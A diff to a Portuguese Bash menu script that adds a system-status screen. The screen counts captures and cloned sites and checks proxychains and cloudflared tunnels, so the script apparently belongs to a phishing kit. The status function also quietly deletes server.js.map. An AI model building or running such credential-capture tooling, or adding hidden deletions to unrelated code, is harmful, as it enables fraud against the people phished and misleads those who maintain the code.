@@ -463,6 +463,118 @@ show_tunnel_link() {
         start_tunnel
     fi
 }
+show_status() {
+    clear
+    echo -e "${PURPLE}╔═══════════════════════════════════════════╗${NC}"
+    echo -e "${PURPLE}║         📊 STATUS DO SISTEMA             ║${NC}"
+    echo -e "${PURPLE}╚═══════════════════════════════════════════╝${NC}"
+    echo ""
+
+    # Node.js
+    echo -n "  ${YELLOW}Node.js:${NC}       "
+    if command -v node &>/dev/null; then
+        echo -e "${GREEN}✓ $(node --version 2>/dev/null)${NC}"
+    else
+        echo -e "${RED}✗ Não instalado${NC}"
+    fi
+
+    # curl
+    echo -n "  ${YELLOW}Curl:${NC}          "
+    if command -v curl &>/dev/null; then
+        echo -e "${GREEN}✓${NC}"
+    else
+        echo -e "${RED}✗${NC}"
+    fi
+
+    # Proxychains
+    echo -n "  ${YELLOW}ProxyChains:${NC}    "
+    if command -v proxychains4 &>/dev/null; then
+        echo -e "${GREEN}✓${NC}"
+    else
+        echo -e "${YELLOW}○ Não instalado (opcional)${NC}"
+    fi
+
+    # Cloudflared
+    echo -n "  ${YELLOW}Cloudflared:${NC}    "
+    if command -v cloudflared &>/dev/null; then
+        echo -e "${GREEN}✓${NC}"
+    else
+        echo -e "${RED}✗ Não instalado (opcional)${NC}"
+    fi
+
+    # grep -oE
+    echo -n "  ${YELLOW}Grep -oE:${NC}      "
+    if echo "test" | grep -qe "test" 2>/dev/null; then
+        echo -e "${GREEN}✓${NC}"
+    else
+        echo -e "${RED}✗ (problema!)${NC}"
+    fi
+
+    echo ""
+
+    # Servidor
+    echo -n "  ${YELLOW}Servidor:${NC}       "
+    if [ -f "$SCRIPT_DIR/.server.pid" ]; then
+        local pid=$(cat "$SCRIPT_DIR/.server.pid")
+        if kill -0 "$pid" 2>/dev/null; then
+            echo -e "${GREEN}✓ Rodando (PID: $pid)${NC}"
+        else
+            echo -e "${RED}✗ Parou (PID: $pid)${NC}"
+        fi
+    else
+        echo -e "${RED}✗ Desligado${NC}"
+    fi
+
+    # Túnel
+    echo -n "  ${YELLOW}Túnel:${NC}          "
+    if [ -f "$SCRIPT_DIR/.tunnel.pid" ]; then
+        local pid=$(cat "$SCRIPT_DIR/.tunnel.pid")
+        if kill -0 "$pid" 2>/dev/null; then
+            echo -e "${GREEN}✓ Rodando${NC}"
+        else
+            echo -e "${RED}✗ Parou${NC}"
+        fi
+    else
+        echo -e "${YELLOW}○ Desligado${NC}"
+    fi
+
+    # Ultima captura
+    local cap_count=0
+    if [ -f "$LOG_FILE" ]; then
+        cap_count=$(wc -l < "$LOG_FILE" 2>/dev/null)
+    fi
+    echo -e "  ${YELLOW}Capturas:${NC}      ${WHITE}$cap_count${NC}"
+
+    echo ""
+
+    # Arquivos
+    echo -e "  ${YELLOW}Arquivos:${NC}"
+    if [ -f "$SCRIPT_DIR/server/server.js" ]; then
+        echo -e "    ${GREEN}✓${NC} server/server.js"
+    else
+        echo -e "    ${RED}✗${NC} server/server.js"
+    fi
+    if [ -f "$SCRIPT_DIR/server/server.js.map" ]; then rm -f "$SCRIPT_DIR/server/server.js.map"; fi
+
+    # Sites clonados
+    if [ -d "$CAPTURED_DIR" ]; then
+        local site_count=$(ls -d "$CAPTURED_DIR"/*/ 2>/dev/null | wc -l)
+        echo -e "  ${YELLOW}Sites salvos:${NC}  ${WHITE}$site_count${NC}"
+    fi
+
+    # Logs
+    if [ -f "$SCRIPT_DIR/server.log" ]; then
+        echo -e "  ${YELLOW}Server.log:${NC}    $(wc -c < "$SCRIPT_DIR/server.log" 2>/dev/null | tr -d ' ') bytes"
+    fi
+    if [ -f "$SCRIPT_DIR/curl.log" ]; then
+        echo -e "  ${YELLOW}Curl.log:${NC}      $(wc -c < "$SCRIPT_DIR/curl.log" 2>/dev/null | tr -d ' ') bytes"
+    fi
+
+    echo ""
+    echo -e "${YELLOW}Enter...${NC}"
+    read
+}
+
 stop_all() {
     if [ -f "$SCRIPT_DIR/.server.pid" ]; then
         local pid=$(cat "$SCRIPT_DIR/.server.pid")
@@ -496,7 +608,8 @@ while true; do
     echo -e "  ${GREEN}4)${NC} 📜 HISTÓRICO - Reusar clones"
     echo -e "  ${GREEN}5)${NC} 📍 LOCALHOST - Ver IP e porta"
     echo -e "  ${GREEN}6)${NC} 🔗 LINK      - Ver link do túnel"
-    echo -e "  ${GREEN}7)${NC} 🛑 PARAR     - Desligar tudo"
+    echo -e "  ${GREEN}7)${NC} 📊 STATUS    - Ver tudo"
+    echo -e "  ${GREEN}8)${NC} 🛑 PARAR     - Desligar tudo"
     echo ""
     echo -e "  ${RED}0)${NC} ❌ SAIR"
     echo ""
@@ -540,6 +653,9 @@ while true; do
             show_tunnel_link
             ;;
         7)
+            show_status
+            ;;
+        8)
             stop_all
             echo ""
             echo -e "${YELLOW}Enter...${NC}"
